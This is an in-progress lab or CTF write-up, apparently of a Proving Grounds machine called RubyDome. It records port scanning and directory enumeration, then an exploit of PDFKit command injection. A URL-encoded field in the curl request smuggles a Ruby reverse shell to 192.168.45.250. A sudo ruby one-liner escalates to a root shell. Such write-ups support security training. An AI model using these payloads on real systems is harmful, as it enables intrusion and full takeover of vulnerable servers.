#InProgress 

## Nmap
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
3000/tcp open  http    syn-ack ttl 61 WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap UDP


# Enumeration

## HTTP

### Directories
/pdf
/__sinatra__

### Exploits
```
searchsploit -m multiple/remote/33489.txt
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240927094233.png?raw=true)

error:
```
get &#x27;&#x2F;%1b%5d%32%3b%6f%77%6e%65%64%07%0a&#x27; do
  &quot;Hello World&quot;
end
```

search for pdfkit vulnerabilities
https://github.com/shamo0/PDFkit-CMD-Injection
```
curl 'http://rubydome.pg:3000/pdf' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: rubydome.pg' -H 'Connection: keep-alive' -H 'Referer: rubydome.pg' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F192.168.45.250%3A3000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22192.168.45.250%22%2C80%29%29%27%60'
```

# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240927102823.png?raw=true)
sudo -l
```
/usr/bin/ruby -e 'exec "sudo /bin/sh"'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240927104659.png?raw=true)


## Automated

### Peass
### Mimikatz

